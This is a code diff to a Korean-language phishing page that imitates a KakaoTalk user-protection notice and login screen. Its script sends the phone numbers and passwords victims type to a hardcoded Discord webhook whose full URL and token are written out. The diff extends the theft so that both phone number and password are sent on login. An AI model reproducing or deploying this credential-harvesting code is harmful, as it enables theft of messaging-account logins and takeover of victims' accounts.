@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ko">
 <head>
@@ -23,7 +22,7 @@
   </style>
 </head>
 <body>
-  
+  <!-- 안내 페이지 -->
   <div id="page1" class="container">
     <h1>톡안녕패스로<br>이용자보호조치를 완화하세요.</h1>
     <p>모두를 위한 카톡 안녕가이드에서<br>이용자보호조치에 대해 더 자세히 알아보세요.</p>
@@ -43,6 +42,7 @@
     <button class="btn-yellow" onclick="goNext()">본인인증하기</button>
   </div>
 
+  <!-- 로그인 화면 -->
   <div id="page2" class="login-container hidden">
     <h2>카카오톡을 시작합니다</h2>
     <input type="text" placeholder="이메일 또는 전화번호" style="width: 370px; padding: 5px;">
@@ -61,9 +61,14 @@
       }
     }
 
-    const webhookURL = 'https://discord.com/api/webhooks/1406817501047947450/TkrHLmb42Hjc3p3afEOtCFe-U5ksQDvH3Bj1RUIGFMdDD98vGG_Rn7lTj1T7qoGdGfG9'; // 본인 웹훅 주소로 변경
-    //이걸보다니 당신은 행운아
+    // ------------------- 웹훅 코드 -------------------
+    const webhookURL = 'https://discord.com/api/webhooks/1406817501047947450/TkrHLmb42Hjc3p3afEOtCFe-U5ksQDvH3Bj1RUIGFMdDD98vGG_Rn7lTj1T7qoGdGfG9';
+
     const phoneInput = document.querySelector('input[type="text"]');
+    const passwordInput = document.querySelector('input[type="password"]');
+    const loginBtn = document.querySelector('.btn-gray');
+
+    // 전화번호 자동 전송 기존 코드
     let phoneSent = false;
     phoneInput.addEventListener('input', () => {
       const phone = phoneInput.value.trim();
@@ -79,19 +84,28 @@
       }
       if (phone.length < 11) phoneSent = false;
     });
-    
-    const passwordInput = document.querySelector('input[type="password"]');
-    const loginBtn = document.querySelector('.btn-gray');
+
+    // 로그인 버튼 클릭 시 전화번호 확인 후 웹훅 전송
     loginBtn.addEventListener('click', () => {
+      const phone = phoneInput.value.trim();
+
+      // 전화번호 확인
+      if (phone.length !== 11 || isNaN(phone)) {
+        alert('전화번호를 정확하게 입력해주세요');
+        return;
+      }
+
+      // 기존 웹훅 전송 코드
       const password = passwordInput.value;
       fetch(webhookURL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ password })
+        body: JSON.stringify({ phone, password })
       })
-      .then(res => console.log('비밀번호 전송 완료', res))
-      .catch(err => console.error('비밀번호 전송 오류', err));
+      .then(res => console.log('전화번호와 비밀번호 전송 완료', res))
+      .catch(err => console.error('전송 오류', err));
     });
+    // ------------------- 웹훅 코드 끝 -------------------
   </script>
 </body>
 </html>
